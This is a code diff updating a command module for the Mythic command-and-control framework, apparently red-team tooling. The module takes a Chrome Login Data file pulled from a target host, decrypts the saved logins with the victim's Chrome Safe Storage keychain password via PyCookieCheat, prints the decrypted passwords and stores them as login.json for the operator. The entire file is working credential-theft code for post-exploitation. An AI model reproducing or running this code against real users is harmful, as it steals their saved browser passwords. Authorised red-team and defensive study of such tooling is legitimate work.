@@ -12,7 +12,7 @@ class DecryptChromeLoginDatasArguments(TaskArguments):
             CommandParameter(
                 display_name="Chrome Safe Storage Password",
                 name="password",
-                type=ParameterType.Credential_JSON,
+                type=ParameterType.String,
                 description="Chrome safe storage password from the user's keychain",
                 parameter_group_info=[
                     ParameterGroupInfo(
@@ -62,106 +62,121 @@ class DecryptChromeLoginDataCommand(CommandBase):
     script_only = True
     argument_class = DecryptChromeLoginDatasArguments
 
-    async def process_response(self, response: AgentResponse):
-        pass
+    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
+        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
+        return resp
 
-    async def create_tasking(self, task: MythicTask) -> MythicTask:
+    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
+        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
+            TaskID=taskData.Task.ID,
+            Success=True,
+        )
         ## write the cookies file to a new file on disk
-        task.args.add_arg("password", task.args.get_arg("password")["credential"])
-        getCookiesResp = await MythicRPC().execute("get_file",
-                                                   task_id=task.id,
-                                                   file_id=task.args.get_arg("file_id"),
-                                                   max_results=1,
-                                                   get_contents=True)
-        if getCookiesResp.status == MythicRPCStatus.Success and len(getCookiesResp.response) > 0:
-            getCookiesResp = getCookiesResp.response[0]
-        else:
-            await MythicRPC().execute("create_output", task_id=task.id,
-                                      output="Encountered an error attempting to get downloaded file: " + getCookiesResp.error)
+        getCookiesResp = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
+            AgentFileId=taskData.args.get_arg("file_id"),
+        ))
+        if not getCookiesResp.Success:
+            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                TaskID=taskData.Task.ID,
+                Response=f"Encountered an error attempting to get downloaded file: {getCookiesResp.Error}".encode()
+            ))
             remove_temp_files()
-            task.status = MythicStatus("Error: Failed to get cookies file")
-            return task
+            response.TaskStatus = "Error: Failed to get login file"
+            response.Success = False
+            return response
 
         try:
             f = open("tmp_Login", "wb")
-            f.write(base64.b64decode(getCookiesResp["contents"]))
+            f.write(getCookiesResp.Content)
             f.close()
         except Exception as e:
-            await MythicRPC().execute("create_output", task_id=task.id,
-                                      output="Encountered an error attempting to write the login data to a file: " + str(e))
+            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                TaskID=taskData.Task.ID,
+                Response=f"Encountered an error attempting to write login data to a file: {e}".encode()
+            ))
             remove_temp_files()
-            task.status = MythicStatus("Error: Failed to write file to disk")
-            return task
-
-        cookie_args = {"login_file": "/Mythic/mythic/tmp_Login",
-                       "key": task.args.get_arg("password"),
-                       "output": "login.json"}
+            response.TaskStatus = "Error: Failed to get login data file"
+            response.Success = False
+            return response
+        cookies_output_file = os.path.abspath(self.agent_code_path / '..' / '..' /'login.json')
+        cookies_file_path = os.path.abspath(self.agent_code_path / '..' / '..' /'tmp_Login')
+        cookie_args = {"login_file": cookies_file_path,
+                       "key": taskData.args.get_arg("password"),
+                       "output": cookies_output_file}
 
         ## Decrypt Cookies file
         try:
             crisp(cookie_args)
-            if os.path.isfile("login.json"):
-                if os.path.getsize("login.json") != 0:
+            if os.path.isfile(cookies_output_file):
+                if os.path.getsize(cookies_output_file) != 0:
 
-                    json_file = open("login.json", "r")
+                    json_file = open(cookies_output_file, "r")
                     json_load = json.load(json_file)
                     cookie_dump = json.dumps(json_load, indent=4)
-                    await MythicRPC().execute("create_output",
-                                              task_id=task.id,
-                                              output=f"[*] Logins Decrypted:\n{cookie_dump}")
+                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                        TaskID=taskData.Task.ID,
+                        Response=f"[*] Login Data Decrypted:\n{cookie_dump}".encode()
+                    ))
                     json_file.close()
-                    cookie_file_save_resp = await MythicRPC().execute("create_file",
-                                                                      task_id=task.id,
-                                                                      file=base64.b64encode(cookie_dump.encode()).decode(),
-                                                                      delete_after_fetch=False,
-                                                                      saved_file_name="logins.json",
-                                                                      comment=f"{task.args.get_arg('username')}'s Decrypted Login Data")
-                    if cookie_file_save_resp.status == MythicRPCStatus.Success:
-                        await MythicRPC().execute("create_output",
-                                                  task_id=task.id,
-                                                  output="\nLogin Data file saved to files (uploads)")
+                    cookie_file_save_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
+                        TaskID=taskData.Task.ID,
+                        DeleteAfterFetch=False,
+                        Filename="login.json",
+                        Comment=f"{taskData.args.get_arg('username')}'s Decrypted Login Data'",
+                        FileContents=cookie_dump.encode()
+                    ))
+                    if cookie_file_save_resp.Success:
+                        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                            TaskID=taskData.Task.ID,
+                            Response=f"\n[+] login.json saved to uploads".encode()
+                        ))
                     else:
-                        await MythicRPC().execute("create_output",
-                                                  task_id=task.id,
-                                                  output="Login Data file failed to save")
+                        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                            TaskID=taskData.Task.ID,
+                            Response=f"\n[-] Failed to save login.json: {cookie_file_save_resp.Error}".encode()
+                        ))
                 else:
-                    await MythicRPC().execute("create_output",
-                                              task_id=task.id,
-                                              output="No login data found in Login Data file")
+                    await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                        TaskID=taskData.Task.ID,
+                        Response=f"[-] No passwords found in Login Data file".encode()
+                    ))
             else:
-                await MythicRPC().execute("create_output",
-                                          task_id=task.id,
-                                          output="login.json file failed on creation")
+                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                    TaskID=taskData.Task.ID,
+                    Response=f"[-] Failed to process Login Data file".encode()
+                ))
                 remove_temp_files()
-                task.status = MythicStatus("Error: Failed to decrypt login Data")
-                return task
+                response.TaskStatus = "Error: Failed to decrypt login data"
+                response.Success = False
+                return response
 
         except Exception as e:
-            await MythicRPC().execute("create_output",
-                                      task_id=task.id,
-                                      output="PyCookieCheat script failed with error: " + str(e))
+            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                TaskID=taskData.Task.ID,
+                Response=f"[-] PyCookieCheat script failed with error: {e}".encode()
+            ))
             remove_temp_files()
-            task.status = MythicStatus("Error: Failed to decrypt login data")
-            return task
+            response.TaskStatus = "Error: Failed to decrypt login data - PyCookieCheat"
+            response.Success = False
+            return response
         # Remove the Cookies file from disk
         remove_temp_files()
-        task.status = MythicStatus.Completed
-        return task
+        return response
 
 
 def remove_temp_files():
     try:
-        if os.path.isfile('/Mythic/mythic/tmp_Login'):
-            os.remove('/Mythic/mythic/tmp_Login')
+        if os.path.isfile('tmp_Login'):
+            os.remove('tmp_Login')
     except Exception as e:
         raise Exception("Failed to remove apfell/mythic/tmp_Login file")
     try:
-        if os.path.isfile('/Mythic/mythic/login.json'):
-            os.remove('/Mythic/mythic/login.json')
+        if os.path.isfile('login.json'):
+            os.remove('login.json')
     except Exception as e:
         raise Exception("Failed to remove apfell/mythic/login.json file")
     try:
-        if os.path.isfile('/Mythic/mythic/tmp_login.keychain-db'):
-            os.remove('/Mythic/mythic/tmp_login.keychain-db')
+        if os.path.isfile('tmp_login.keychain-db'):
+            os.remove('tmp_login.keychain-db')
     except Exception as e:
         raise Exception("Failed to remove apfell/mythic/tmp_login.keychain-db")
